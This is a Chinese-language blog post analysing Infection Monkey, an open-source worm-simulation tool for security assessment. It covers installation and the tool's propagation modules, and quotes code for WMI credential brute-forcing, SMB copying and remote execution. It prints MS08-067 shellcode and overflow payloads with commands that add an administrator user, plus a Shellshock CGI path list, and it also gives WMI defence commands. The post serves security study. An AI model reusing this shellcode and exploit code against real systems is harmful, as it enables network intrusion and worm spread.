---
layout:     post
title:  Infection Monkey蠕虫模拟感染工具
subtitle:   Infection Monkey
date:       2018-12-12
author:     DC
header-img: img/post-bg-universe.jpg
catalog: true
tags:

    - worm
    - tool

---

# Infection Monkey

[TOC]

近来跟进了一个来自guardicore公司的工具，名字叫Infection Monkey，是一个基于自身为C2的向外进行蠕虫扩散，评估安全性的开源产品，想法相当惊艳，同时名字也较为有趣，将C&C端比喻为monkey island(猴岛)，将对外的蠕虫比喻为感染_monkey,通过感染mongkey的感染情况来进行，自动化生成环境测试报告。这个工具思路非常不错，借此做了简单的搭建，同时分析下其上的感染模块 和信息搜集模块，作为内外网蠕虫攻击手段的典型案例来学习[项目地址](https://github.com/guardicore/monkey)。

### 环境搭建

搭建环境：Ubuntu 14.04 

> 安装包安装：[安装包](https://github.com/guardicore/monkey/releases/download/1.5.2/infection_monkey_1.5.2_deb.tgz)
>
> 命令行：
>
> ​	sudo dpkg -i monkey_island.deb
>
> ​	sudo apt-get install -f
>
> ​	根据提示直接安装完成，直接访问 https://<server-ip>:5000 可以访问其C&C管理控制界面

> 源码安装：[安装指南](https://github.com/guardicore/monkey/blob/master/monkey/monkey_island/readme.txt)

这里直接通过安装包安装成功，自己尝试了源码安装16版本安装编译时间过长不是非常成功

![img](https://github.com/guardicore/monkey/raw/develop/.github/map-full.png)

可以看到 他的功能页面

### 功能介绍

主要功能为：

- 启动搭建服务器为C&C服务器
- 启动运行monkey 蠕虫（该蠕虫是基于sambacry蠕虫，进行python打包，采用HTTPS进行通信)
- 还有个可视化的感染途径表
- 自动生成报告接口
- 插件配置接口（漏洞配置，攻击扫描配置之类的，感觉在集成模块上较为麻烦）

他支持的的主要感染技术为：

- Multiple propagation techniques:
  - Predefined passwords
  - Common logical exploits
  - Password stealing using Mimikatz
- Multiple exploit methods:
  - SSH
  - SMB
  - RDP
  - WMI
  - Shellshock
  - Conficker
  - SambaCry
  - Elastic Search (CVE-2015-1427)

均为一些常见的内网感染模块，后面分析下这些感染模块的对应代码。

```cmd
infection_monkey（感染猴子）的 代码树如下
要分析编译部分、利用模块部分、host处理部分、sambacry利用部分、通信扫描部分、系统信息回收部分、通信协议部分。
│  build_linux.sh          ##该部分模块主要用于 monkey配置编译生成，方便控制中心处理
│  build_windows.bat
│  config.py
│  control.py
│  dropper.py
│  example.conf
│  main.py
│  monkey-linux.spec
│  monkey.ico
│  monkey.py
│  monkey.spec
│  monkeyfs.py
│  pyinstaller_utils.py
│  readme.txt
│  requirements.txt
│  system_singleton.py
│  tunnel.py
│  utils.py
│  windows_upgrader.py
│  __init__.py
│
├─exploit
│      elasticgroovy.py
│      hadoop.py 
│      rdpgrinder.py   #rdbp
│      sambacry.py  
│      shellshock.py
│      shellshock_resources.py  #shellshock 资源
│      smbexec.py
│      sshexec.py
│      struts2.py
│      tools.py   #各种协议框架
│      weblogic.py
│      web_rce.py   #web 配置接口
│      win_ms08_067.py
│      wmiexec.py
│      __init__.py
│
├─model
│      host.py    ##主要为猴子基础信息，对象
│      __init__.py
│
├─monkey_utils
│  └─sambacry_monkey_runner
│          build.sh
│          sc_monkey_runner.c   #主要实现了linux层面的Drop功能，拼接命令行，运行monkey
│          sc_monkey_runner.h
│
├─network
│      elasticfinger.py   #对9200端口进行访问回收指纹
│      firewall.py        #配置防火墙接口规则接口方法
│      httpfinger.py      #http 请求获取指纹 主要apache
│      info.py            #获取子网和主机网卡数据
│      mssql_fingerprint.py # port:1434 查询：Microsoft SQL Server实例信息  
│      mysqlfinger.py     #3306 mysql实例信息
│      network_scanner.py   # 扫描本地网络和/或扫描固定的IP /子网列表
│      ping_scanner.py     #ping 
│      smbfinger.py        #smb 的封装协议发送 获取 主机信息
│      sshfinger.py        #22端口 扫描获取信息
│      tcp_scanner.py      #TCP扫描获取Banner
│      tools.py            #数据报索引检查处理输出，用于对接结构
│      __init__.py
│
├─system_info
│      aws_collector.py            #自动回收AWS信息
│      azure_cred_collector.py     #通过 azure VM Access 获取信息密码
│      linux_info_collector.py     #linux 信息获取
│      mimikatz_collector.py       #获取mimi获取信息
│      netstat_collector.py        #提取netstat信息
│      SSH_info_collector.py       #自动收集ssh秘钥信息
│      windows_info_collector.py   #用于Windows操作系统的系统信息收集模块
│      wmi_consts.py               #wmi 查询接口语法 windows接口调用
│      __init__.py
│
└─transport
        base.py
        http.py
        tcp.py
        __init__.py

```

#####  

AWS信息获取(直接调用了官方接口)

```python 
import urllib2

__author__ = 'itay.mizeretz'


class AWS(object):
    def __init__(self):
        try:
            self.instance_id = urllib2.urlopen('http://169.254.169.254/latest/meta-data/instance-id').read() #需要在AWS机器上才能获取instance_id
        except urllib2.URLError:
            self.instance_id = None

    def get_instance_id(self):
        return self.instance_id

    def is_aws_instance(self):
        return self.instance_id is not None
```



#### exploit [code](https://github.com/guardicore/monkey/tree/develop/monkey/infection_monkey/exploit)

学习复现其蠕虫自带攻击手法

##### 1.wmiexec  [参考资料](https://www.secpulse.com/archives/39555.html)

> WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统。当攻击者使用wmiexec来进行攻击时，Windows系统默认不会在日志中记录这些操作，这意味着可以做到攻击无日志，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。越来越多的APT事件中也出现了WMI攻击的影子，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。
>
> 最开始我不太喜欢WMI，因为通过WMI执行的命令是没有回显的，这会带来很大的不便。不过在HES2014上有研究者提出了回显的思路，加上psexec类的攻击已被很多的杀软查杀，研究下WMI攻击还是很有必要的。
>
> ```
> 常见的WMI攻击工具有这些
> PTH-WMIS (最早wmi攻击的工具，单条命令执行，无回显，需要pth-smbget配合读取结果)
> impackets wmiexec(Linux跨window经常用)
> wmiexec.vbs (国人制造 为了回显会写文件)
> Invoke-WmiCommand&Invoke-PowerShellWmi
> ```

wmi模块采用传统的账号密码爆破

```python
 creds = self._config.get_exploit_user_password_or_hash_product()  #获取账号密码或者hash

        for user, password, lm_hash, ntlm_hash in creds: #尝试暴力破解
            LOG.debug("Attempting to connect %r using WMI with user,password,lm hash,ntlm hash: ('%s','%s','%s','%s')",
                      self.host, user, password, lm_hash, ntlm_hash)

            wmi_connection = WmiTools.WmiConnection()

            try:
                wmi_connection.connect(self.host, user, password, None, lm_hash, ntlm_hash)
            except AccessDeniedException:
                
                
#查看该进程是否在本机运行过
 process_list = WmiTools.list_object(wmi_connection, "Win32_Process",
                                                fields=("Caption",),
                                                where="Name='%s'" % ntpath.split(src_path)[-1])

# 通过smb协议拷贝文件到目标机器上  copy the file remotely using SMB
            remote_full_path = SmbTools.copy_file(self.host,
                                                  src_path,
                                                  self._config.dropper_target_path_win_32,
                                                  user,
                                                  password,
                                                  lm_hash,
                                                  ntlm_hash,
                                                  self._config.smb_download_timeout)
    
 # 执行蠕虫 execute the remote monkey
            result = WmiTools.get_object(wmi_connection, "Win32_Process").Create(cmdline,
                                                                                 ntpath.split(remote_full_path)[0],
                                                                                 None)
```

wmi和ps的功能相似 ，通过口令登录（口令可为user:password 或者 LM 、NTLM，在没有爆破出账号密码情况，可尝试采用WCEhash注入：提取LM、NTLM来测试）

> 早期SMB协议在网络上传输明文口令。后来出现"LAN Manager Challenge/Response" 
> 验证机制，简称LM，它是如此简单以至很容易被[破解](https://www.2cto.com/article/jiami/)。微软提出了WindowsNT挑战/响 
> 应验证机制，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。

- 需要远程系统启动 Windows Management Instrumentation 服务，开放135端口
- 远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”
- 根据情况管理员权限
- 会有杀软查杀问题

```
这里采用 [ranger](https://github.com/funkandwagnalls/ranger) 工具包进行测试，

python ranger.py -u root -p toor  -t 192.168.79.133 --wmiexec -c "Net User"

[*] Attempting to access the system 192.168.79.133 with, user: root pwd: toor domain: WORKGROUP at: 2018-12-10-22:13:23
[+] StringBinding: \\\\EC7EB9743270462[\\PIPE\\atsvc][+] StringBinding: \\\\EC7EB9743270462[\\PIPE\\wkssvc][+] StringBinding: \\\\EC7EB9743270462[\\pipe\\keysvc][+] StringBinding: \\\\EC7EB9743270462[\\pipe\\trkwks][+] StringBinding: \\\\EC7EB9743270462[\\PIPE\\srvsvc][+] StringBinding: \\\\EC7EB9743270462[\\PIPE\\W32TIME][+] StringBinding: \\\\EC7EB9743270462[\\PIPE\\browser][+] StringBinding: ec7eb9743270462[1042][+] StringBinding: 192.168.79.133[1042]
[*] [+] The command Net User was successful on 192.168.79.133
[*][*] Wrote results to the following location /opt/ranger/results/command/command_192.168.79.133
[*] 
\\ ���û��ʻ�

------

Administrator            Guest                    HelpAssistant            
root                     SUPPORT_388945a0         
```

针对WMI 的防御检测，[WMI的攻击、防御与取证分析技术之防御篇](http://netsecurity.51cto.com/art/201511/496610.htm) 大概讲的思路是，通过wmi的事件定阅，来实现类似IDS的功能实时检测。

取证分析基本以wmi服务日志log 和事件消息为主

```
1、查看当前WMI Event

【管理员权限】

#List Event Filters
Get-WMIObject -Namespace root\Subscription -Class __EventFilter

#List Event Consumers
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer

#List Event Bindings
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding

2、清除后门


#Filter
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilter82'" | Remove-WmiObject -Verbose

#Consumer
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumer23'" | Remove-WmiObject -Verbose

#Binding
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotFilter82%'" | Remove-WmiObject -Verbose
```
##### 2.MS08-067

> MS08-067漏洞的全称为“Windows Server服务RPC请求缓冲区溢出漏洞”，如果用户在受影响的系统上收到特制的 RPC 请求，则该漏洞可能允许远程履行代码。在 Microsoft Windows 2000、Windows XP 和 Windows Server 2003 系统上，攻击者可能未经身份验证即可利用此漏洞运行任意代码

该漏洞披露事件为2008年，具体测试操作方法可直接采用[MS08_067](https://www.cnblogs.com/yayaer/p/6685527.html)

该蠕虫采取的方法为

```python
# Portbind shellcode from metasploit; Binds port to TCP port 4444
SHELLCODE = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
SHELLCODE += "\x29\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xe9"
SHELLCODE += "\x4a\xb6\xa9\x83\xee\xfc\xe2\xf4\x15\x20\x5d\xe4\x01\xb3\x49\x56"
SHELLCODE += "\x16\x2a\x3d\xc5\xcd\x6e\x3d\xec\xd5\xc1\xca\xac\x91\x4b\x59\x22"
SHELLCODE += "\xa6\x52\x3d\xf6\xc9\x4b\x5d\xe0\x62\x7e\x3d\xa8\x07\x7b\x76\x30"
SHELLCODE += "\x45\xce\x76\xdd\xee\x8b\x7c\xa4\xe8\x88\x5d\x5d\xd2\x1e\x92\x81"
SHELLCODE += "\x9c\xaf\x3d\xf6\xcd\x4b\x5d\xcf\x62\x46\xfd\x22\xb6\x56\xb7\x42"
SHELLCODE += "\xea\x66\x3d\x20\x85\x6e\xaa\xc8\x2a\x7b\x6d\xcd\x62\x09\x86\x22"
SHELLCODE += "\xa9\x46\x3d\xd9\xf5\xe7\x3d\xe9\xe1\x14\xde\x27\xa7\x44\x5a\xf9"
SHELLCODE += "\x16\x9c\xd0\xfa\x8f\x22\x85\x9b\x81\x3d\xc5\x9b\xb6\x1e\x49\x79"
SHELLCODE += "\x81\x81\x5b\x55\xd2\x1a\x49\x7f\xb6\xc3\x53\xcf\x68\xa7\xbe\xab"
SHELLCODE += "\xbc\x20\xb4\x56\x39\x22\x6f\xa0\x1c\xe7\xe1\x56\x3f\x19\xe5\xfa"
SHELLCODE += "\xba\x19\xf5\xfa\xaa\x19\x49\x79\x8f\x22\xa7\xf5\x8f\x19\x3f\x48"
SHELLCODE += "\x7c\x22\x12\xb3\x99\x8d\xe1\x56\x3f\x20\xa6\xf8\xbc\xb5\x66\xc1"
SHELLCODE += "\x4d\xe7\x98\x40\xbe\xb5\x60\xfa\xbc\xb5\x66\xc1\x0c\x03\x30\xe0"
SHELLCODE += "\xbe\xb5\x60\xf9\xbd\x1e\xe3\x56\x39\xd9\xde\x4e\x90\x8c\xcf\xfe"
SHELLCODE += "\x16\x9c\xe3\x56\x39\x2c\xdc\xcd\x8f\x22\xd5\xc4\x60\xaf\xdc\xf9"
SHELLCODE += "\xb0\x63\x7a\x20\x0e\x20\xf2\x20\x0b\x7b\x76\x5a\x43\xb4\xf4\x84"
SHELLCODE += "\x17\x08\x9a\x3a\x64\x30\x8e\x02\x42\xe1\xde\xdb\x17\xf9\xa0\x56"
SHELLCODE += "\x9c\x0e\x49\x7f\xb2\x1d\xe4\xf8\xb8\x1b\xdc\xa8\xb8\x1b\xe3\xf8"
SHELLCODE += "\x16\x9a\xde\x04\x30\x4f\x78\xfa\x16\x9c\xdc\x56\x16\x7d\x49\x79"
SHELLCODE += "\x62\x1d\x4a\x2a\x2d\x2e\x49\x7f\xbb\xb5\x66\xc1\x19\xc0\xb2\xf6"
SHELLCODE += "\xba\xb5\x60\x56\x39\x4a\xb6\xa9"

# Payload for Windows 2000 target
PAYLOAD_2000 = '\x41\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00'
PAYLOAD_2000 += '\x41\x41\x41\x41\x41\x41\x41\x41'
PAYLOAD_2000 += '\x41\x41\x41\x41\x41\x41\x41\x41'
PAYLOAD_2000 += '\x41\x41'
PAYLOAD_2000 += '\x2f\x68\x18\x00\x8b\xc4\x66\x05\x94\x04\x8b\x00\xff\xe0'
PAYLOAD_2000 += '\x43\x43\x43\x43\x43\x43\x43\x43'
PAYLOAD_2000 += '\x43\x43\x43\x43\x43\x43\x43\x43'
PAYLOAD_2000 += '\x43\x43\x43\x43\x43\x43\x43\x43'
PAYLOAD_2000 += '\x43\x43\x43\x43\x43\x43\x43\x43'
PAYLOAD_2000 += '\x43\x43\x43\x43\x43\x43\x43\x43'
PAYLOAD_2000 += '\xeb\xcc'
PAYLOAD_2000 += '\x00\x00'

# Payload for Windows 2003[SP2] target
PAYLOAD_2003 = '\x41\x00\x5c\x00'
PAYLOAD_2003 += '\x2e\x00\x2e\x00\x5c\x00\x2e\x00'
PAYLOAD_2003 += '\x2e\x00\x5c\x00\x0a\x32\xbb\x77'
PAYLOAD_2003 += '\x8b\xc4\x66\x05\x60\x04\x8b\x00'
PAYLOAD_2003 += '\x50\xff\xd6\xff\xe0\x42\x84\xae'
PAYLOAD_2003 += '\xbb\x77\xff\xff\xff\xff\x01\x00'
PAYLOAD_2003 += '\x01\x00\x01\x00\x01\x00\x43\x43'
PAYLOAD_2003 += '\x43\x43\x37\x48\xbb\x77\xf5\xff'
PAYLOAD_2003 += '\xff\xff\xd1\x29\xbc\x77\xf4\x75'
PAYLOAD_2003 += '\xbd\x77\x44\x44\x44\x44\x9e\xf5'
PAYLOAD_2003 += '\xbb\x77\x54\x13\xbf\x77\x37\xc6'
PAYLOAD_2003 += '\xba\x77\xf9\x75\xbd\x77\x00\x00'

###  以上为 脚本中拷贝msf上的 payload 数据

--------------------------------------------------------
os_version = self._windows_versions.get(self.host.os.get('version'), WindowsVersion.Windows2003_SP2) #获取目标机器版本
exploit = SRVSVC_Exploit(target_addr=self.host.ip_addr, os_version=os_version)
sock = exploit.start() #使用twisted框架写的 DECRPC 协议构造漏洞利用进行攻击
sock.send("cmd /c (net user %s %s /add) &&"
                          " (net localgroup administrators %s /add)\r\n" %
                          (self._config.ms08_067_remote_user_add,
                           self._config.ms08_067_remote_user_pass,
                           self._config.ms08_067_remote_user_add))
## 添加用户 主要为了 后面的 smb 感染
 remote_full_path = SmbTools.copy_file(self.host,
                                              src_path,
                                              self._config.dropper_target_path_win_32,
                                              self._config.ms08_067_remote_user_add,
                                              self._config.ms08_067_remote_user_pass)
 ## smb 进行蠕虫感染

 sock.send("net user %s /delete\r\n" % (self._config.ms08_067_remote_user_add,))
    
 ##感染后删除用户
```

#采用snort 流量进行检测

##### 3.weblogic

[weblogic CVE-2017-10271 反序列化漏洞利用](https://github.com/kkirsche/CVE-2017-10271)

针对性的对 weblogic的反序列化漏洞进行了攻击

攻击流程与以上相似，不做说明

##### 4.struts2 [资源地址](https://github.com/xsscx/cve-2017-5638)

struts 045 的利用代码

攻击流程与以上相似，不做说明

##### 5.sshexec

ssh爆破模块

##### 6.smbexec 

smb 爆破利用

##### 7.shellshock

>  Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。
>
> 在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。
>
> 简单来说就是由于服务器的cgi脚本调用了bash命令，由于bash版本过低，攻击者把有害数据写入环境变量，传到服务器端，触发服务器运行Bash脚本，完成攻击。

蠕虫采用

shellshock.py（拼接cgi url）、shellshock_resources.py(存储url资源) 、多采用echo ; 截断方式做命令执行

url资源节选

```python
CGI_FILES = (r'/',
 r'/admin.cgi',
 r'/administrator.cgi',
 r'/agora.cgi',
 r'/aktivate/cgi-bin/catgy.cgi',
 r'/analyse.cgi',
 r'/apps/web/vs_diag.cgi',
 r'/axis-cgi/buffer/command.cgi',
 r'/b2-include/b2edit.showposts.php',
 r'/bandwidth/index.cgi',
 r'/bigconf.cgi',
```

##### 8.sambacry 

采用了 [CVE-2017-7494](https://github.com/SecureAuthCorp/impacket/blob/master/examples/sambaPipe.p) 漏洞利用模块

利用手法与以上流程相似，不做说明

#####  9.RDP 

RDP 爆破攻击

##### 10.hadoop 未访问授权

[Hadoop YARN ResourceManager 未授权访问](https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn)

##### 11.elasticgroovy
[CVE-2015-1427](https://github.com/t0kx/exploit-CVE-2015-1427)